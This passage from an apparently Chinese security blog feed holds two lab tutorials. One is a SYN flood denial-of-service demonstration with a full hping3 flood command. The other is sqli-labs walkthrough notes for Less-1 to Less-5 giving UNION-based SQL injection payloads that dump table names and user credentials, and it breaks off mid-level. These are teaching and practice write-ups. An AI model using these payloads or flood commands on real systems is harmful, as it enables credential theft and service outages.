        <content type="html"><![CDATA[<h1 id="SYN-Flood攻击"><a href="#SYN-Flood攻击" class="headerlink" title="SYN Flood攻击"></a>SYN Flood攻击</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>SYN flood攻击是一种常见的拒绝服务（DoS）攻击，旨在通过耗尽目标系统的资源（内存或连接表），使其无法处理合法的连接请求</p><p>首先我们要清楚TCP三次握手的原理，以下是建立TCP连接的过程：</p><ol><li>SYN：首先客户端向服务器发送一个SYN包，请求建立连接</li><li>SYN-ACK：服务器收到SYN包，返回一个SYN-ACK包</li><li>ACK：客户端收到SYN-ACK包后返回一个ACK包，完成连接建立</li></ol><p><img src="Untitled.png" alt="Untitled"></p><p>而我们的SYN Flood攻击就是利用了TCP建立连接的这个过程：</p><ol><li>向目标主机发送大量伪造源IP的SYN报文</li><li>服务器收到SYN报文后，分配资源，开启半开连接，返回SYN-ACK报文，等待ACK报文</li><li>由于SYN报文中的源IP是伪造的，所以服务器并不会收到ACK报文，从而使连接一直处于半开（half-open）</li><li>服务器需要处理这些半开连接，并消耗资源（内存和连接表），最终导致资源耗尽，无法处理新的连接请求</li></ol><p><img src="Untitled%201.png" alt="Untitled"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>一台kali攻击机（192.168.199.128）</li><li>一台Windows Server 2016 作为靶机（192.168.199.136）</li></ul><p>接下来我们来演示以下SYN Flood攻击，演示环境皆在内网环境中，确保两台机器在同一内网环境中</p><p><img src="Untitled%202.png" alt="Untitled"></p><p><img src="Untitled%203.png" alt="Untitled"></p><p>关闭windows的防火墙，保持两台机器可以相互ping通</p><p><img src="Untitled%204.png" alt="Untitled"></p><p><strong>kali ping Windows</strong></p><p><img src="Untitled%205.png" alt="Untitled"></p><p><strong>Windows ping kali</strong></p><p><img src="Untitled%206.png" alt="Untitled"></p><h2 id="SYN-Flood攻击-1"><a href="#SYN-Flood攻击-1" class="headerlink" title="SYN Flood攻击"></a>SYN Flood攻击</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>我们使用命令，对目标主机进行扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.199.136</span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>使用参数-sS后，这个命令和我们的攻击原理很相似，都是与目标机器进行不完全的TCP连接，所以</p><p>nmap -sS扫描也称为半开扫描</p><p><strong>优点：</strong></p><ul><li><strong>速度快</strong>：由于不完成三次握手，扫描速度较快。</li><li><strong>隐蔽性高</strong>：由于连接未完全建立，目标主机的日志中不会记录完整的连接，较难被检测到。</li><li><strong>资源消耗低</strong>：目标主机不需要为每个连接分配过多资源。</li></ul><p>顺便还可以为我们探测可以发起SYN Flood攻击的端口，由扫描结果可知，靶机开启了135，139，445端口，接下来我们对445端口进行攻击演示</p><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><blockquote><p>hping3是一个命令行网络工具，用于生成和分析 TCP/IP 数据包。它类似于 <code>ping</code> 工具，但功能更强大，支持构造和发送各种自定义数据包，可以用于网络诊断、测试和攻击模拟等多种用途</p></blockquote><p><strong>参数</strong></p><ul><li>-c 数据包个数</li><li>-d 数据包大小</li><li>-S 发送SYN包</li><li>-w TCP窗口大小，指未收到确认包前可以发送但未确认的数据包个数</li><li>-p 端口</li><li>—flood 泛洪攻击</li><li>—rand-source  随机源IP</li></ul><p><strong>命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hping3 -c 10000000 -d 1000000 -S -w 100 -p 5357 --flood --rand-source 192.168.199.136</span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><p><strong>windows性能前后对比</strong></p><p><strong>攻击前</strong></p><p><img src="Untitled%209.png" alt="Untitled"></p><p><strong>攻击后</strong></p><p><img src="Untitled%2010.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql-labs通关笔记(上)</title>
      <link href="/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/"/>
      <url>/2024/07/01/sql-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0(%E4%B8%8A)/</url>
      
        <content type="html"><![CDATA[<h1 id="sql-labs通关笔记-上"><a href="#sql-labs通关笔记-上" class="headerlink" title="sql-labs通关笔记(上)"></a>sql-labs通关笔记(上)</h1><p><img src="Untitled.png" alt="Untitled"></p><h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><h2 id="Less-1：GET-Error-based-Single-quotes-string"><a href="#Less-1：GET-Error-based-Single-quotes-string" class="headerlink" title="Less-1：GET -Error based.Single quotes -string"></a>Less-1：GET -Error based.Single quotes -string</h2><h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="Untitled%201.png" alt="Untitled"></p><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%202.png" alt="Untitled"></p><p><code>?id=-1</code> </p><p><img src="Untitled%203.png" alt="Untitled"></p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%204.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>报错信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1<span class="string">&#x27;&#x27;</span> LIMIT 0,1<span class="string">&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>报错信息中，去掉用于标识的两个单引号，报错信息为<code>&#39;-1&#39;&#39; LIMIT 0,1</code></p><p>可以看到我们这一关的sql语句是用单引号闭合的，我们确认一下</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; or 1=1--+</span></span><br></pre></td></tr></table></figure><p><strong>回显</strong></p><p><img src="Untitled%205.png" alt="Untitled"></p><p>现在已经可以确定其存在字符型的注入点，使用单引号闭合</p><h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>关于order by</strong> </p><p>众所周知，order by是用于排序的，而其中有一项就是可以按照查询数据的索引来举行排序</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news order by 2;</span><br></pre></td></tr></table></figure><p>意思就是我们按照查询结果的第二个字段也就是<code>title</code>进行升序（默认升序）排序</p><p><strong>结果：</strong></p><p><img src="Untitled%206.png" alt="Untitled"></p><p>但是当我们的索引号大于我们查询的字段总数时，就会报错，就比如刚刚一段代码，我们查询的字段数为2，当我们以第三个字段进行排序时，就会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news order by 3;</span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="Untitled%207.png" alt="Untitled"></p><p>因此，我们可以借助order by这个关键字来判断查询语句中，查询的字段数数量</p><p>我们大概可以看到，每次id改变，回显大概有两个，一个用户名，一个密码</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>因此说明这条查询语句查询的字段至少是2个</p><p>我们从3开始,发现并没有报错</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="Untitled%209.png" alt="Untitled"></p><p>继续尝试4</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=1<span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：</strong></p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>由此我们可以发现，我们当前页面的sql语句查询的字段数为3</p><p><strong>那么我们为什么要判断字段数呢？</strong></p><p>因为我们要使用联合查询进行注入，而联合查询后面联合的sql查询语句查询的字段数需要和前面的sql语句一致，我们依旧在一个数据库中进行演示</p><p>比如：</p><p><strong>当后面查询语句查询的字段数和前面查询语句查询的字段数相同时：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news union select 1,2;</span><br></pre></td></tr></table></figure><p><strong>结果：会将结果罗列到后面</strong></p><p><img src="Untitled%2011.png" alt="Untitled"></p><p><strong>当后面查询语句查询的字段数和前面查询语句查询的字段数不同时：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="built_in">id</span>,title from news union select 1,2,3;</span><br></pre></td></tr></table></figure><p><strong>结果：会报错，具有不同的字段数</strong></p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>判断出查询语句的字段数后，我们就可以判断回显位置了，判断我们查询的（3个）字段，会有几个将结果回显到网页页面</p><h3 id="判断回显位置"><a href="#判断回显位置" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-1/?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p><p><img src="Untitled%2013.png" alt="Untitled"></p><p><strong>那么，为什么前面要将id=-1？</strong></p><p>因为我们网页的回显位置有限，为了将我们想要的数据回显到页面上可以回显的位置，所以需要将原本的查询结果集置为空，因为没有id=-1的数据，所以我们想要的数据1，2，3就会优先填充到回显位上了</p><h3 id="爆破数据库名"><a href="#爆破数据库名" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：查询到当前数据库名称为security</strong></p><p><img src="Untitled%2014.png" alt="Untitled"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><ul><li>group_concat()  将查询到的多个值聚合成一个字符串，依旧是因为回显位置不足，将其聚合在一个字符串，可以直接全部回显出来</li><li>information_schema MYSQL自带的数据库，里面含有<code>schemas</code>，<code>tables</code>，<code>coulmns</code>表等，分别储存着所有数据库的信息（包括名称，其余也是），所有表的信息，所有字段的信息，是我们sql注入的强大利器</li></ul><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>一般来说我们最需要的就是用户名和密码，这种东西一般存在users表中，接下来爆破users表的字段</p><h3 id="爆破字段名"><a href="#爆破字段名" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,uname,passwd</strong></p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>可以看到我们查出的数据有点多，我们去数据库中对比一下</p><p><img src="Untitled%2017.png" alt="Untitled"></p><p>发现其实只有三个字段，那么，<strong>为什么会查出这么多呢？</strong></p><p>没错，因为我们没有指定数据库的名称，只指定了表的名字，当多个数据库中存在相同的表名时，都会被查询出来。如果出现了这种情况，我们可以同时指定数据库的名称</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：只有id,username,password</strong></p><p><img src="Untitled%2018.png" alt="Untitled"></p><p>而我们需要的数据，就是<code>username</code>和<code>password</code></p><h3 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure><ul><li>0x7e ~的十六进制编码，用来分隔数据</li></ul><p><strong>结果：得到所有数据，第一关结束</strong></p><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="Less-2：GET-Error-based-intiger-based"><a href="#Less-2：GET-Error-based-intiger-based" class="headerlink" title="Less-2：GET -Error based -intiger based"></a>Less-2：GET -Error based -intiger based</h2><h3 id="界面-1"><a href="#界面-1" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2020.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2021.png" alt="Untitled"></p><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-2/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure><p><strong>报错信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;\ LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p>去掉，用来引用报错信息的单引号，我们可以知道，存在注入点，并且为数值型注入</p><h3 id="判断字段数-1"><a href="#判断字段数-1" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 order by 3--+</span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><p><img src="Untitled%2023.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1 order by 4--+</span><br></pre></td></tr></table></figure><p><strong>结果：判断出字段数为3</strong></p><p><img src="Untitled%2024.png" alt="Untitled"></p><h3 id="判断回显位置-1"><a href="#判断回显位置-1" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p><p><img src="Untitled%2025.png" alt="Untitled"></p><h3 id="爆破数据库名-1"><a href="#爆破数据库名-1" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,database()--+</span><br></pre></td></tr></table></figure><p><strong>结果：查询到当前数据库名称为security</strong></p><p><img src="Untitled%2026.png" alt="Untitled"></p><h3 id="爆破表名-1"><a href="#爆破表名-1" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2027.png" alt="Untitled"></p><h3 id="爆破字段名-1"><a href="#爆破字段名-1" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">&#x27;users&#x27;</span> and table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名id,username,password</strong></p><p><img src="Untitled%2028.png" alt="Untitled"></p><h3 id="爆破数据-1"><a href="#爆破数据-1" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1 union select 1,2,group_concat(username,0x7e,password) from <span class="built_in">users</span>--+</span><br></pre></td></tr></table></figure><p><strong>结果：得到所有数据，第二关结束</strong></p><p><img src="Untitled%2029.png" alt="Untitled"></p><h2 id="Less-3：GET-Error-based-Single-quotes-with-twist-string"><a href="#Less-3：GET-Error-based-Single-quotes-with-twist-string" class="headerlink" title="Less-3：GET -Error based -Single quotes with twist -string"></a>Less-3：GET -Error based -Single quotes with twist -string</h2><h3 id="界面-2"><a href="#界面-2" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2030.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2031.png" alt="Untitled"></p><h3 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%2032.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-3/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure><p><strong>报错信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1\<span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p>去掉用于引用报错信息的单引号<code>&#39;-1\&#39;) LIMIT 0,1</code> 我们可以知道，此时的sql语句是用单引号和括号闭合的</p><h3 id="判断字段数-2"><a href="#判断字段数-2" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;) order by 3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果</strong></p><p><img src="Untitled%2033.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;) order by 4--+</span></span><br></pre></td></tr></table></figure><p><strong>结果:可以判断字段数为3</strong></p><p><img src="Untitled%2034.png" alt="Untitled"></p><h3 id="判断回显位置-2"><a href="#判断回显位置-2" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上即可</strong></p><p><img src="Untitled%2035.png" alt="Untitled"></p><h3 id="爆破数据库名-2"><a href="#爆破数据库名-2" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：查询到当前数据库名称为security</strong></p><p><img src="Untitled%2036.png" alt="Untitled"></p><h3 id="爆破表名-2"><a href="#爆破表名-2" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2037.png" alt="Untitled"></p><h3 id="爆破字段名-2"><a href="#爆破字段名-2" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名id,username,password</strong></p><p><img src="Untitled%2038.png" alt="Untitled"></p><h3 id="爆破数据-2"><a href="#爆破数据-2" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;) union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到所有数据，第三关结束</strong></p><p><img src="Untitled%2039.png" alt="Untitled"></p><h2 id="Less-4：GET-Error-based-Double-Quotes-string"><a href="#Less-4：GET-Error-based-Double-Quotes-string" class="headerlink" title="Less-4：GET -Error based -Double Quotes -string"></a>Less-4：GET -Error based -Double Quotes -string</h2><h3 id="界面-3"><a href="#界面-3" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2040.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2041.png" alt="Untitled"></p><h3 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%2042.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-4/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure><p><strong>报错信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;-1\&quot;) LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p>去掉用于引用报错信息的单引号<code>&quot;-1\&quot;) LIMIT 0,1</code> 我们可以知道，此时的sql语句是用双引号和括号闭合的</p><h3 id="判断字段数-3"><a href="#判断字段数-3" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) order by 3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果:</strong></p><p><img src="Untitled%2043.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;) order by 4--+</span></span><br></pre></td></tr></table></figure><p><strong>结果:可以判断字段数为3</strong></p><p><img src="Untitled%2044.png" alt="Untitled"></p><h3 id="判断回显位置-3"><a href="#判断回显位置-3" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：可以发现我们的2，3回显到网页页面了，因此我们后面就可以将需要查询的信息，放到2，3的位置上</strong></p><p><img src="Untitled%2045.png" alt="Untitled"></p><h3 id="爆破数据库名-3"><a href="#爆破数据库名-3" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,database()--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：查询到当前数据库名称为security</strong></p><p><img src="Untitled%2046.png" alt="Untitled"></p><h3 id="爆破表名-3"><a href="#爆破表名-3" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2047.png" alt="Untitled"></p><h3 id="爆破字段名-3"><a href="#爆破字段名-3" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名id,username,password</strong></p><p><img src="Untitled%2048.png" alt="Untitled"></p><h3 id="爆破数据-3"><a href="#爆破数据-3" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot;) union select 1,2,group_concat(username,0x7e,password) from users--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到所有数据，第四关结束</strong></p><p><img src="Untitled%2049.png" alt="Untitled"></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="Less-5：GET-Double-Injection-single-Quotes-String"><a href="#Less-5：GET-Double-Injection-single-Quotes-String" class="headerlink" title="Less-5：GET -Double Injection -single Quotes -String"></a>Less-5：GET -Double Injection -single Quotes -String</h2><h3 id="界面-4"><a href="#界面-4" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2050.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2051.png" alt="Untitled"></p><h3 id="判断注入点-4"><a href="#判断注入点-4" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%2052.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-5/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure><p><strong>报错信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&#x27;</span>-1\<span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 